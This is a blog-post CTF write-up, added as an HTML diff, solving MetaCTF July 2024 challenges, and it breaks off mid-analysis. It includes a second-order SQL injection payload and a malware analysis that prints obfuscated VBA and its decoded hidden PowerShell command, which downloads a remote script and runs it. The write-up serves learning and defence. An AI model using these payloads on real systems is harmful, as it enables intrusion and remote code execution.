@@ -1,0 +1,411 @@
+<!doctype html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <link href="https://blog.psypherpunk.io/css/bootstrap.min.css" rel="stylesheet">
+        <link href="https://blog.psypherpunk.io/css/blog.css" rel="stylesheet">
+        
+        <link rel="alternate" type="application/rss+xml" title="RSS" href="https://blog.psypherpunk.io/rss.xml">
+        
+        <script src="https://kit.fontawesome.com/80cf39a0f7.js" crossorigin="anonymous"></script>
+        <title>️🏴 MetaCTF July 2024 Flash CTF</title>
+    </head>
+    <body>
+        <nav class="navbar navbar-expand-lg fixed-top navbar-dark bg-primary">
+    <div class="container">
+        <a class="navbar-brand" href="/">psypherpunk::blog</a>
+        <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbar-collapse" aria-controls="navbar-collapse" aria-expanded="false" aria-label="Toggle links">
+            <span class="navbar-toggler-icon"></span>
+        </button>
+        <div class="collapse navbar-collapse" id="navbar-collapse">
+            <ul class="navbar-nav ms-auto text-end">
+                <li class="nav-item">
+                    <a class="nav-link" href="/tags"><i class="fa fa-hashtag"></i> tags</a>
+                </li>
+                <li class="nav-item">
+                    <a target="_blank" rel="noopener" class="nav-link" href="https://github.com/psypherpunk"><i class="fa fa-github"></i> GitHub</a>
+                </li>
+                <li class="nav-item">
+                    <a target="_blank" rel="noopener" class="nav-link" href="https://twitter.com/psypherpunk"><i class="fa fa-twitter"></i> Twitter</a>
+                </li>
+                <li class="nav-item">
+                    <a target="_blank" rel="me noopener" class="nav-link" href="https://hachyderm.io/@psypherpunk"><i class="fa-brands fa-mastodon"></i> Mastodon</a>
+                </li>
+            </ul>
+        </div>
+    </div>
+</nav>
+        <main class="container">
+            
+    <h1 class="title">
+        ️🏴 MetaCTF July 2024 Flash CTF
+    </h1>
+    <blockquote>A monthly mini CTF competition organized by MetaCTF and Antisyphon.</blockquote>
+    <p class="subtitle text-end"><strong>2024-07-19</strong></p>
+    
+        <p class="text-end">
+            <small class="tag">
+                
+                    <a href="https://blog.psypherpunk.io/tags/ctf/" >
+                        #ctf
+                    </a>
+                
+            </small>
+        </p>
+    
+    <blockquote>
+<p><em>A monthly mini CTF competition organized by MetaCTF with support from
+Antisyphon Training and TCM Security. There will be 5 challenges and you will
+have 2 hours to solve as many as you can. This is a beginner-friendly CTF.</em></p>
+</blockquote>
+<p>Details here: <a href="https://app.metactf.com/join/jul2024">https://app.metactf.com/join/jul2024</a>.</p>
+<h2 id="wheel-of-mystery">Wheel Of Mystery</h2>
+<blockquote>
+<p><em>My friend wanted to communicate using a secret cipher.</em></p>
+<p><em>He gave me the message <code>RKPUYPFCIAKKJMYZZJT</code> along with this wheel:</em></p>
+<p><em>Can you decrypt the message he sent?</em></p>
+</blockquote>
+<p>It's a spinny cipher-wheel-thing!</p>
+<p>The outer, static wheel appears to be the uppercase alphabet plus braces; the
+inner wheel, which rotates, is a seemingly-randomised alphabet, again with
+braces.</p>
+<p>Given the rotation, it's not clear in which position the wheel is supposed to
+be so…brute force!</p>
+<p>Setting up the contents of both sections of the wheel:</p>
+<pre data-lang="python" style="background-color:#2b303b;color:#c0c5ce;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#b48ead;">import </span><span>string
+</span><span style="color:#b48ead;">from </span><span>collections </span><span style="color:#b48ead;">import </span><span>deque
+</span><span>
+</span><span>
+</span><span>outer = string.ascii_uppercase + &quot;</span><span style="color:#d08770;">{}</span><span>&quot;
+</span><span>inner = </span><span style="color:#bf616a;">deque</span><span>(&quot;</span><span style="color:#a3be8c;">COSDHG</span><span style="color:#d08770;">{QNFUVWLEZYXPTKMR}</span><span style="color:#a3be8c;">ABJI</span><span>&quot;)
+</span><span>
+</span><span style="color:#b48ead;">assert </span><span style="color:#96b5b4;">len</span><span>(outer) == </span><span style="color:#96b5b4;">len</span><span>(inner)
+</span><span>
+</span><span>msg = &quot;</span><span style="color:#a3be8c;">RKPUYPFCIAKKJMYZZJT</span><span>&quot;
+</span></code></pre>
+<p>Using a <code>deque</code>, it's possible to rotate the inner wheel easily enough:</p>
+<pre data-lang="python" style="background-color:#2b303b;color:#c0c5ce;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#b48ead;">for </span><span>rotation </span><span style="color:#b48ead;">in </span><span style="color:#96b5b4;">range</span><span>(</span><span style="color:#96b5b4;">len</span><span>(outer)):
+</span><span>    inner.</span><span style="color:#bf616a;">rotate</span><span>(rotation)
+</span><span>
+</span><span>    lookup = </span><span style="color:#bf616a;">dict</span><span>(</span><span style="color:#96b5b4;">zip</span><span>(outer, inner))
+</span><span>
+</span><span>    </span><span style="color:#96b5b4;">print</span><span>(&quot;&quot;.</span><span style="color:#bf616a;">join</span><span>(lookup[c] </span><span style="color:#b48ead;">for </span><span>c </span><span style="color:#b48ead;">in </span><span>msg))
+</span></code></pre>
+<p>That produces a lot of gibberish but in there is:</p>
+<pre data-lang="sh" style="background-color:#2b303b;color:#c0c5ce;" class="language-sh "><code class="language-sh" data-lang="sh"><span style="color:#bf616a;">METACTF{WHEELYCOOL</span><span>}
+</span></code></pre>
+<h2 id="second-breakfast">Second Breakfast</h2>
+<blockquote>
+<p><em>This diner makes some of the best breakfast around, can you help me test
+their website? I hope that if I find a vulnerability, they might give me a
+free second order!</em></p>
+<p><em>Here's a <a href="http://26c7265ff.chals.mctf.io/">link to their website</a>. They
+also gave me a copy of their
+<a href="https://metaproblems.com/bf9082db72ce5961399e373b5cbb84ea/breakfast.zip">source code</a>.</em></p>
+</blockquote>
+<p>As part of the setup, the flag is added directly into the database:</p>
+<pre data-lang="sql" style="background-color:#2b303b;color:#c0c5ce;" class="language-sql "><code class="language-sql" data-lang="sql"><span style="color:#b48ead;">INSERT INTO</span><span> flags (flag) </span><span style="color:#b48ead;">VALUES</span><span> (&#39;</span><span style="color:#a3be8c;">FLAG_REDACTED_GO_GET_THE_REAL_ONE</span><span>&#39;);
+</span></code></pre>
+<p>Most of the site correctly uses parameterised queries, save one endpoint:</p>
+<pre data-lang="python" style="background-color:#2b303b;color:#c0c5ce;" class="language-python "><code class="language-python" data-lang="python"><span>@app.</span><span style="color:#bf616a;">route</span><span>(&#39;</span><span style="color:#a3be8c;">/profile</span><span>&#39;)
+</span><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">profile</span><span>():
+</span><span>    </span><span style="color:#b48ead;">if </span><span>&#39;</span><span style="color:#a3be8c;">username</span><span>&#39; not in session:
+</span><span>        </span><span style="color:#b48ead;">return </span><span style="color:#bf616a;">redirect</span><span>(</span><span style="color:#bf616a;">url_for</span><span>(&#39;</span><span style="color:#a3be8c;">login</span><span>&#39;))
+</span><span>    
+</span><span>    username = session[&#39;</span><span style="color:#a3be8c;">username</span><span>&#39;]
+</span><span>    
+</span><span>    conn = </span><span style="color:#bf616a;">get_db_connection</span><span>()
+</span><span>    cursor = conn.</span><span style="color:#bf616a;">cursor</span><span>()
+</span><span>    
+</span><span>    query = </span><span style="color:#b48ead;">f</span><span>&quot;</span><span style="color:#a3be8c;">SELECT username, created_at FROM users WHERE username=&#39;</span><span>{username}</span><span style="color:#a3be8c;">&#39;</span><span>&quot;
+</span><span>    cursor.</span><span style="color:#bf616a;">execute</span><span>(query)
+</span><span>    user = cursor.</span><span style="color:#bf616a;">fetchone</span><span>()
+</span></code></pre>
+<p>That would require a user whose <code>username</code> will fulfil a SQLi to retrieve the
+flag ("second order SQLi, for all the cool kids). Thankfully, it's possible to
+register a user with exactly that.</p>
+<p>Creating a user with the <code>username</code>:</p>
+<pre data-lang="sql" style="background-color:#2b303b;color:#c0c5ce;" class="language-sql "><code class="language-sql" data-lang="sql"><span>meta&#39;</span><span style="color:#a3be8c;"> UNION SELECT flag, CURRENT_TIMESTAMP FROM flags WHERE </span><span>&#39;</span><span style="color:#d08770;">1</span><span>&#39;</span><span style="color:#a3be8c;"> = </span><span>&#39;</span><span style="color:#d08770;">1
+</span></code></pre>
+<p>…causes the <code>query</code> in the above to retrieve the <code>flag</code> as the <code>username</code> and
+<code>created_at</code> as the current time, resulting in a greeting of:</p>
+<pre data-lang="html" style="background-color:#2b303b;color:#c0c5ce;" class="language-html "><code class="language-html" data-lang="html"><span>&lt;</span><span style="color:#bf616a;">h1</span><span>&gt;Welcome, MetaCTF{Ill_h4v3_7h47_s3c0nd_0rd3r_0f_SQLi_pl3453}&lt;/</span><span style="color:#bf616a;">h1</span><span>&gt;
+</span></code></pre>
+<h2 id="flag-appraisal">Flag Appraisal</h2>
+<blockquote>
+<p><em>My buddy started a pawn shop and made a bet that I could never get a
+counterfeit flag past him.</em></p>
+<p><em>I know exactly how his system works, so I'm certain I can sneak one past
+him. Check out his shop application
+<a href="https://metaproblems.com/0f8a4c04644dfc5b7105e8d173a8d871/pawn_shop">here</a>.</em></p>
+</blockquote>
+<p>Courtesy of <a href="https://dogbolt.org/">Decompiler Explorer</a>, the main function is:</p>
+<pre data-lang="c" style="background-color:#2b303b;color:#c0c5ce;" class="language-c "><code class="language-c" data-lang="c"><span style="color:#b48ead;">bool </span><span style="color:#8fa1b3;">FUN_0010128e</span><span>(</span><span style="color:#b48ead;">void</span><span>)
+</span><span>
+</span><span>{
+</span><span>  </span><span style="color:#b48ead;">int</span><span> iVar1;
+</span><span>  size_t </span><span style="color:#bf616a;">sVar2</span><span>;
+</span><span>  </span><span style="color:#b48ead;">long</span><span> in_FS_OFFSET;
+</span><span>  </span><span style="color:#b48ead;">char</span><span> local_78 [</span><span style="color:#d08770;">104</span><span>];
+</span><span>  </span><span style="color:#b48ead;">long</span><span> local_10;
+</span><span>  
+</span><span>  local_10 = *(</span><span style="color:#b48ead;">long </span><span>*)(in_FS_OFFSET + </span><span style="color:#d08770;">0x28</span><span>);
+</span><span>  </span><span style="color:#96b5b4;">printf</span><span>(&quot;</span><span style="color:#a3be8c;">Welcome to my Pawn Shop, go ahead and show me the flag you want appraised: </span><span>&quot;);
+</span><span>  </span><span style="color:#96b5b4;">fgets</span><span>(local_78,</span><span style="color:#d08770;">100</span><span>,stdin);
+</span><span>  </span><span style="color:#bf616a;">sVar2 </span><span>= </span><span style="color:#96b5b4;">strcspn</span><span>(local_78,&quot;</span><span style="color:#96b5b4;">\n</span><span>&quot;);
+</span><span>  local_78[</span><span style="color:#bf616a;">sVar2</span><span>] = &#39;</span><span style="color:#96b5b4;">\0</span><span>&#39;;
+</span><span>  </span><span style="color:#bf616a;">sVar2 </span><span>= </span><span style="color:#96b5b4;">strlen</span><span>(local_78);
+</span><span>  </span><span style="color:#bf616a;">FUN_00101199</span><span>(local_78,</span><span style="color:#bf616a;">sVar2 </span><span>&amp; </span><span style="color:#d08770;">0xffffffff</span><span>);
+</span><span>  iVar1 = </span><span style="color:#96b5b4;">strncmp</span><span>(local_78,&amp;DAT_00102058,</span><span style="color:#d08770;">0x25</span><span>);
+</span><span>  </span><span style="color:#b48ead;">if </span><span>(iVar1 != </span><span style="color:#d08770;">0</span><span>) {
+</span><span>    </span><span style="color:#96b5b4;">puts</span><span>(&quot;</span><span style="color:#a3be8c;">Unfortunately, your flag here looks to be a counterfeit.</span><span>&quot;);
+</span><span>  }
+</span><span>  </span><span style="color:#b48ead;">else </span><span>{
+</span><span>    </span><span style="color:#96b5b4;">puts</span><span>(&quot;</span><span style="color:#a3be8c;">Well good news, your flag looks to be authentic! Best I can do is $2.</span><span>&quot;);
+</span><span>  }
+</span><span>  </span><span style="color:#b48ead;">if </span><span>(local_10 != *(</span><span style="color:#b48ead;">long </span><span>*)(in_FS_OFFSET + </span><span style="color:#d08770;">0x28</span><span>)) {
+</span><span>                    </span><span style="color:#65737e;">// WARNING: Subroutine does not return
+</span><span>    </span><span style="color:#bf616a;">__stack_chk_fail</span><span>();
+</span><span>  }
+</span><span>  </span><span style="color:#b48ead;">return</span><span> iVar1 != </span><span style="color:#d08770;">0</span><span>;
+</span><span>}
+</span></code></pre>
+<p>The user input is passed through a function and, if it matches <code>DAT_00102058</code>
+and is 37 bytes (<code>0x25</code> above), is valid.</p>
+<p>That function, <code>FUN_00101199</code>, is:</p>
+<pre data-lang="c" style="background-color:#2b303b;color:#c0c5ce;" class="language-c "><code class="language-c" data-lang="c"><span style="color:#b48ead;">void </span><span style="color:#8fa1b3;">FUN_00101199</span><span>(</span><span style="color:#b48ead;">long </span><span style="color:#bf616a;">param_1</span><span>,uint </span><span style="color:#bf616a;">param_2</span><span>)
+</span><span>
+</span><span>{
+</span><span>  uint local_10;
+</span><span>  </span><span style="color:#b48ead;">int</span><span> local_c;
+</span><span>  
+</span><span>  local_10 = </span><span style="color:#d08770;">0</span><span>;
+</span><span>  </span><span style="color:#b48ead;">for </span><span>(local_c = </span><span style="color:#d08770;">0</span><span>; local_c &lt; (</span><span style="color:#b48ead;">int</span><span>)(param_2 - </span><span style="color:#d08770;">1</span><span>); local_c = local_c + </span><span style="color:#d08770;">2</span><span>) {
+</span><span>    local_10 = local_10 * </span><span style="color:#d08770;">0x21 </span><span>^
+</span><span>               *(</span><span style="color:#b48ead;">char </span><span>*)(param_1 + (</span><span style="color:#b48ead;">long</span><span>)local_c + </span><span style="color:#d08770;">1</span><span>) * </span><span style="color:#d08770;">0x1fd </span><span>^ *(</span><span style="color:#b48ead;">char </span><span>*)(param_1 + local_c) * </span><span style="color:#d08770;">0x101
+</span><span>    ;
+</span><span>    *(</span><span style="color:#b48ead;">char </span><span>*)(param_1 + local_c) = (</span><span style="color:#b48ead;">char</span><span>)local_10;
+</span><span>    *(</span><span style="color:#b48ead;">char </span><span>*)(param_1 + (</span><span style="color:#b48ead;">long</span><span>)local_c + </span><span style="color:#d08770;">1</span><span>) = (</span><span style="color:#b48ead;">char</span><span>)(local_10 &gt;&gt; </span><span style="color:#d08770;">8</span><span>);
+</span><span>  }
+</span><span>  </span><span style="color:#b48ead;">if </span><span>((param_2 &amp; </span><span style="color:#d08770;">1</span><span>) != </span><span style="color:#d08770;">0</span><span>) {
+</span><span>    *(byte *)(param_1 + (</span><span style="color:#b48ead;">long</span><span>)(</span><span style="color:#b48ead;">int</span><span>)param_2 + -</span><span style="color:#d08770;">1</span><span>) =
+</span><span>         (</span><span style="color:#b48ead;">char</span><span>)local_10 * &#39;</span><span style="color:#a3be8c;">!</span><span>&#39; ^ *(byte *)(param_1 + (</span><span style="color:#b48ead;">long</span><span>)(</span><span style="color:#b48ead;">int</span><span>)param_2 + -</span><span style="color:#d08770;">1</span><span>);
+</span><span>  }
+</span><span>  </span><span style="color:#b48ead;">return</span><span>;
+</span><span>}
+</span></code></pre>
+<p>Translating that into Python:</p>
+<pre data-lang="python" style="background-color:#2b303b;color:#c0c5ce;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">FUN_00101199</span><span>(</span><span style="color:#bf616a;">input_</span><span>: list[int]):
+</span><span>    state = </span><span style="color:#d08770;">0
+</span><span>    length = </span><span style="color:#96b5b4;">len</span><span>(input_)
+</span><span>
+</span><span>    </span><span style="color:#b48ead;">for </span><span>i </span><span style="color:#b48ead;">in </span><span style="color:#96b5b4;">range</span><span>(</span><span style="color:#d08770;">0</span><span>, length - </span><span style="color:#d08770;">1</span><span>, </span><span style="color:#d08770;">2</span><span>):
+</span><span>        state = (input_[i] * </span><span style="color:#d08770;">257</span><span>) ^ (input_[i + </span><span style="color:#d08770;">1</span><span>] * </span><span style="color:#d08770;">509</span><span>) ^ (state * </span><span style="color:#d08770;">33</span><span>)
+</span><span>        input_[i] = state &amp; </span><span style="color:#d08770;">0xff
+</span><span>        input_[i + </span><span style="color:#d08770;">1</span><span>] = (state &gt;&gt; </span><span style="color:#d08770;">8</span><span>) &amp; </span><span style="color:#d08770;">0xff
+</span><span>
+</span><span>    </span><span style="color:#b48ead;">if </span><span>length % </span><span style="color:#d08770;">2 </span><span>!= </span><span style="color:#d08770;">0</span><span>:
+</span><span>        state = (input_[length - </span><span style="color:#d08770;">1</span><span>] * </span><span style="color:#d08770;">257</span><span>) ^ (state * </span><span style="color:#d08770;">33</span><span>)
+</span><span>        input_[length - </span><span style="color:#d08770;">1</span><span>] = state &amp; </span><span style="color:#d08770;">0xff
+</span></code></pre>
+<p><code>DAT_00102058</code> is visible in memory as (again, translated to Python):</p>
+<pre data-lang="python" style="background-color:#2b303b;color:#c0c5ce;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#bf616a;">DAT_00102058 </span><span>= [
+</span><span>    </span><span style="color:#d08770;">0x9C</span><span>,
+</span><span>    </span><span style="color:#d08770;">0x85</span><span>,
+</span><span>    </span><span style="color:#d08770;">0xB5</span><span>,
+</span><span>    </span><span style="color:#d08770;">0x8D</span><span>,
+</span><span>    </span><span style="color:#d08770;">0x12</span><span>,
+</span><span>    </span><span style="color:#d08770;">0xA0</span><span>,
+</span><span>    </span><span style="color:#d08770;">0x9B</span><span>,
+</span><span>    </span><span style="color:#d08770;">0x10</span><span>,
+</span><span>    </span><span style="color:#d08770;">0xE8</span><span>,
+</span><span>    </span><span style="color:#d08770;">0x1F</span><span>,
+</span><span>    </span><span style="color:#d08770;">0x2B</span><span>,
+</span><span>    </span><span style="color:#d08770;">0xB3</span><span>,
+</span><span>    </span><span style="color:#d08770;">0xDB</span><span>,
+</span><span>    </span><span style="color:#d08770;">0x4A</span><span>,
+</span><span>    </span><span style="color:#d08770;">0x87</span><span>,
+</span><span>    </span><span style="color:#d08770;">0x1E</span><span>,
+</span><span>    </span><span style="color:#d08770;">0x39</span><span>,
+</span><span>    </span><span style="color:#d08770;">0xBD</span><span>,
+</span><span>    </span><span style="color:#d08770;">0x03</span><span>,
+</span><span>    </span><span style="color:#d08770;">0x32</span><span>,
+</span><span>    </span><span style="color:#d08770;">0xC6</span><span>,
+</span><span>    </span><span style="color:#d08770;">0xD0</span><span>,
+</span><span>    </span><span style="color:#d08770;">0x82</span><span>,
+</span><span>    </span><span style="color:#d08770;">0xDB</span><span>,
+</span><span>    </span><span style="color:#d08770;">0xCD</span><span>,
+</span><span>    </span><span style="color:#d08770;">0x46</span><span>,
+</span><span>    </span><span style="color:#d08770;">0x82</span><span>,
+</span><span>    </span><span style="color:#d08770;">0xA1</span><span>,
+</span><span>    </span><span style="color:#d08770;">0x6D</span><span>,
+</span><span>    </span><span style="color:#d08770;">0x09</span><span>,
+</span><span>    </span><span style="color:#d08770;">0x80</span><span>,
+</span><span>    </span><span style="color:#d08770;">0xE5</span><span>,
+</span><span>    </span><span style="color:#d08770;">0x6C</span><span>,
+</span><span>    </span><span style="color:#d08770;">0x7F</span><span>,
+</span><span>    </span><span style="color:#d08770;">0x6C</span><span>,
+</span><span>    </span><span style="color:#d08770;">0x82</span><span>,
+</span><span>    </span><span style="color:#d08770;">0x91</span><span>,
+</span><span>]
+</span></code></pre>
+<p>So, given <code>DAT_00102058</code> as input, I need a function which <em>reverses</em>
+<code>FUN_00101199</code> to produce the flag.</p>
+<p>This is the best I could come up with:</p>
+<pre data-lang="python" style="background-color:#2b303b;color:#c0c5ce;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#b48ead;">def </span><span style="color:#8fa1b3;">_99110100_NUF</span><span>(</span><span style="color:#bf616a;">dat</span><span>: list[int]):
+</span><span>    state = </span><span style="color:#d08770;">0
+</span><span>    length = </span><span style="color:#96b5b4;">len</span><span>(dat)
+</span><span>    input_ = [</span><span style="color:#d08770;">0</span><span>] * length
+</span><span>
+</span><span>    </span><span style="color:#b48ead;">for </span><span>i </span><span style="color:#b48ead;">in </span><span style="color:#96b5b4;">range</span><span>(</span><span style="color:#d08770;">0</span><span>, length - </span><span style="color:#d08770;">1</span><span>, </span><span style="color:#d08770;">2</span><span>):
+</span><span>        save_state = dat[i] | (dat[i + </span><span style="color:#d08770;">1</span><span>] &lt;&lt; </span><span style="color:#d08770;">8</span><span>)
+</span><span>
+</span><span>        </span><span style="color:#b48ead;">for </span><span>j </span><span style="color:#b48ead;">in </span><span style="color:#96b5b4;">range</span><span>(</span><span style="color:#d08770;">128</span><span>):
+</span><span>            </span><span style="color:#b48ead;">for </span><span>k </span><span style="color:#b48ead;">in </span><span style="color:#96b5b4;">range</span><span>(</span><span style="color:#d08770;">128</span><span>):
+</span><span>                _state = (j * </span><span style="color:#d08770;">257</span><span>) ^ (k * </span><span style="color:#d08770;">509</span><span>) ^ (state * </span><span style="color:#d08770;">33</span><span>)
+</span><span>                </span><span style="color:#b48ead;">if </span><span>_state &amp; </span><span style="color:#d08770;">0xFFFF </span><span>== save_state:
+</span><span>                    input_[i], input_[i + </span><span style="color:#d08770;">1</span><span>] = </span><span style="color:#96b5b4;">chr</span><span>(j), </span><span style="color:#96b5b4;">chr</span><span>(k)
+</span><span>                    </span><span style="color:#b48ead;">break
+</span><span>            </span><span style="color:#b48ead;">else</span><span>:
+</span><span>                </span><span style="color:#b48ead;">continue
+</span><span>            </span><span style="color:#b48ead;">break
+</span><span>
+</span><span>        state = save_state
+</span><span>
+</span><span>    </span><span style="color:#b48ead;">for </span><span>i </span><span style="color:#b48ead;">in </span><span style="color:#96b5b4;">range</span><span>(</span><span style="color:#d08770;">128</span><span>):
+</span><span>        </span><span style="color:#b48ead;">if </span><span>((i * </span><span style="color:#d08770;">257</span><span>) ^ (state * </span><span style="color:#d08770;">33</span><span>)) &amp; </span><span style="color:#d08770;">0xFF </span><span>== dat[length - </span><span style="color:#d08770;">1</span><span>]:
+</span><span>            input_[length - </span><span style="color:#d08770;">1</span><span>] = </span><span style="color:#96b5b4;">chr</span><span>(i)
+</span><span>            </span><span style="color:#b48ead;">break
+</span><span>
+</span><span>    </span><span style="color:#b48ead;">return </span><span>&quot;&quot;.</span><span style="color:#bf616a;">join</span><span>(input_)
+</span></code></pre>
+<p>…and it works!</p>
+<p>(…eventually, after some fighting with that last character…)</p>
+<pre data-lang="sh" style="background-color:#2b303b;color:#c0c5ce;" class="language-sh "><code class="language-sh" data-lang="sh"><span style="color:#bf616a;">❯</span><span> ./pawn_shop.py
+</span><span style="color:#bf616a;">MetaCTF{c0un73rf3171ng_7h3_p4wn_</span><span>$</span><span style="color:#bf616a;">h0p</span><span>}
+</span></code></pre>
+<h2 id="keeper-in-the-net">Keeper In The Net</h2>
+<blockquote>
+<p><em>Our customer believes that something suspicious was going on in their
+network. Can you save the day and figure out what the attacked did?</em></p>
+<p><em>Here's a
+<a href="https://metaproblems.com/34a924fe063ce00ebb96126da330ac45/KeeperInTheNet.pcapng">pcap</a>
+of the incident.</em></p>
+</blockquote>
+<p>Via WireShark, the provided <code>KeeperInTheNet.pcapng</code> contains a HTTP GET for a
+<code>Drill_2024.doc</code> file. Running <code>olevba</code> (courtesy of
+<a href="https://github.com/decalage2/oletools"><code>decalage2/oletools</code></a>) over that
+reveals a whole caboodle of VBA macros.</p>
+<p>One function, <code>JERWafGg()</code>, appears to be a base64-decode; it's later called to
+decode the result of a series of base64 concatentations:</p>
+<pre data-lang="vba" style="background-color:#2b303b;color:#c0c5ce;" class="language-vba "><code class="language-vba" data-lang="vba"><span>HAdjTg8 = Chr(88)
+</span><span>jyaiOGq8Y = &quot;cG93Z&quot;
+</span><span>NVuAyL = jyaiOGq8Y &amp; HAdjTg8
+</span><span>WcpUY = &quot;JzaGVsbCAtV2luZG93U3R5bGUgSGlkZGVuICR3c2NyaXB0ID0gbm&quot;
+</span><span>pYdk3 = &quot;V3LW9iamVjdCAtQ29tT2JqZWN0IFdTY3JpcHQuU2hlbGw7JHd&quot;
+</span><span>s7qEy6 = &quot;lYmNsaWVudCA9IG5ldy1vYmplY3QgU3lzdGVtLk5ldC5XZWJDbGllbnQ7JHJhbmRv&quot;
+</span><span>xS64130k = WcpUY &amp; pYdk3 &amp; s7qEy6
+</span><span>yMTzNDzh = NVuAyL &amp; xS64130k
+</span><span>DOwIWXYbJ = &quot;bSA9IG5ldy1vYmplY3QgcmFuZG9tOyR1cmxzID0gJ2h0dH&quot;
+</span><span>t5ysx = &quot;BzOi8vZ2lzdC5naXRodWJ1c2VyY29udGVudC5jb20vaGFja2RhbWV0YXZlcnNlLzhjYzk0NzFjMGUwMTJjNjk2NjhkYjkzY2M&quot;
+</span><span>hjLGi = &quot;2YzkyN2U1L3Jhdy8yZTg1YjY3M2I4ZmFmNWQ5NzU4ZTlhNTk0YjcxYWY4MmNiMTY3YzdhL2dpdGh1Yi5wczEnLlNw&quot;
+</span><span>OQfe5BhbT = DOwIWXYbJ &amp; t5ysx &amp; hjLGi
+</span><span>yMTzNDzhyQ = yMTzNDzh &amp; OQfe5BhbT
+</span><span>WdpeGhumO = &quot;bGl0KCcsJyk7JG5hbWUgPSAkcmFuZG9tLm5leHQoMSwgN&quot;
+</span><span>ThHBT3JqI = &quot;jU1MzYpOyRwYXRoID0gJGVudjp0ZW&quot;
+</span><span>tB65ZJd9 = &quot;1wICsgJ1wnICsgJG5hbWUgKyAnLnB&quot;
+</span><span>xRgONcKLq = WdpeGhumO &amp; ThHBT3JqI &amp; tB65ZJd9
+</span><span>jqfwUJ = &quot;zMSc7Zm9yZWFja&quot;
+</span><span>Uv10MF = &quot;CgkdXJsIGluICR1cmxzKXt0cnl7JHdlYmNsaWVudC5Eb3dubG9h&quot;
+</span><span>u6V3e = &quot;ZEZpbGUoJHVybC5Ub1N0cmluZ&quot;
+</span><span>tnavr6 = jqfwUJ &amp; Uv10MF &amp; u6V3e
+</span><span>yMTzNDzhy = xRgONcKLq &amp; tnavr6
+</span><span>JDqWL8ju = &quot;ygpLCAkcGF0aCk7SUVYICRwYXRoO2&quot;
+</span><span>FtLGF = &quot;JyZWFrO31jYXRjaHt3cml0ZS1ob3N0ICRfLkV4Y2VwdGlvbi5NZXNzYWdlO319&quot;
+</span><span>yOa0X2 = JDqWL8ju &amp; FtLGF
+</span><span>MTzNDzhyQ = yMTzNDzhy &amp; yOa0X2
+</span></code></pre>
+<p>…finally being called as:</p>
+<pre data-lang="vba" style="background-color:#2b303b;color:#c0c5ce;" class="language-vba "><code class="language-vba" data-lang="vba"><span>f6tDZP72 = JERWafGg(yMTzNDzhyQ &amp; MTzNDzhyQ)
+</span></code></pre>
+<p>…the result of which is executed by:</p>
+<pre data-lang="sh" style="background-color:#2b303b;color:#c0c5ce;" class="language-sh "><code class="language-sh" data-lang="sh"><span style="color:#bf616a;">WinExec</span><span> f6tDZP72, w7VGb
+</span></code></pre>
+<p>The base64-decoded content being executed therein is:</p>
+<pre data-lang="sh" style="background-color:#2b303b;color:#c0c5ce;" class="language-sh "><code class="language-sh" data-lang="sh"><span style="color:#bf616a;">powershell -WindowStyle</span><span> Hidden $</span><span style="color:#bf616a;">wscript</span><span> = new-object</span><span style="color:#bf616a;"> -ComObject</span><span> WScript.Shell;$</span><span style="color:#bf616a;">webclient</span><span> = new-object System.Net.WebClient;$</span><span style="color:#bf616a;">random</span><span> = new-object random;$</span><span style="color:#bf616a;">urls</span><span> = &#39;</span><span style="color:#a3be8c;">https://gist.githubusercontent.com/hackdametaverse/8cc9471c0e012c69668db93cc6c927e5/raw/2e85b673b8faf5d9758e9a594b71af82cb167c7a/github.ps1</span><span>&#39;.Split(&#39;</span><span style="color:#a3be8c;">,</span><span>&#39;);$</span><span style="color:#bf616a;">name</span><span> = $</span><span style="color:#bf616a;">random</span><span>.next(1, 65536);$</span><span style="color:#bf616a;">path</span><span> = $</span><span style="color:#bf616a;">env</span><span>:temp + &#39;</span><span style="color:#a3be8c;">\</span><span>&#39; + $</span><span style="color:#bf616a;">name</span><span> + &#39;</span><span style="color:#a3be8c;">.ps1</span><span>&#39;;</span><span style="color:#bf616a;">foreach</span><span>($</span><span style="color:#bf616a;">url</span><span> in $</span><span style="color:#bf616a;">urls</span><span>)</span><span style="color:#bf616a;">{try{</span><span>$</span><span style="color:#bf616a;">webclient.DownloadFile</span><span>($</span><span style="color:#bf616a;">url</span><span>.ToString()</span><span style="color:#bf616a;">, </span><span>$</span><span style="color:#bf616a;">path</span><span>);</span><span style="color:#bf616a;">IEX </span><span>$</span><span style="color:#bf616a;">path</span><span>;</span><span style="color:#b48ead;">break</span><span>;}</span><span style="color:#bf616a;">catch{write-host </span><span>$</span><span style="color:#bf616a;">_</span><span>.Exception.Message;}}
+</span></code></pre>
+<p>The contents of that Gist appear to be yet more PowerShell containing another
+base64 chunk, followed by a <code>dECOMprESS</code> call:</p>
+<pre data-lang="python" style="background-color:#2b303b;color:#c0c5ce;" class="language-python "><code class="language-python" data-lang="python"><span style="color:#b48ead;">import </span><span>base64
+</span><span style="color:#b48ead;">import </span><span>requests
+</span><span style="color:#b48ead;">import </span><span>zlib
+</span><span>
+</span><span>
+</span><span>data = requests.</span><span style="color:#bf616a;">get</span><span>(
+</span><span>    &quot;</span><span style="color:#a3be8c;">https://gist.githubusercontent.com/hackdametaverse/8cc9471c0e012c69668db93cc6c927e5/raw/2e85b673b8faf5d9758e9a594b71af82cb167c7a/github.ps1</span><span>&quot;
+</span><span>).text[</span><span style="color:#d08770;">167</span><span>:-</span><span style="color:#d08770;">106</span><span>]
+</span><span>
+</span><span>decompress = zlib.</span><span style="color:#bf616a;">decompressobj</span><span>(-zlib.</span><span style="color:#bf616a;">MAX_WBITS</span><span>)
+</span><span>decompressed = decompress.</span><span style="color:#bf616a;">decompress</span><span>(base64.</span><span style="color:#bf616a;">b64decode</span><span>(data))
+</span><span style="color:#96b5b4;">print</span><span>(decompressed.</span><span style="color:#bf616a;">decode</span><span>())
+</span></code></pre>
+<p>That produces quite a bit of obfuscated code.</p>
+<p>There's hints of encryption in here, via a <code>function DECry'Pt(</code> function,
+which points to AES as the algorithm of choice:
+<code>'reate','AesMa','C','t','jec','nagedOb')</code>.</p>
+<p>…and after much munging of strings, there's this:</p>
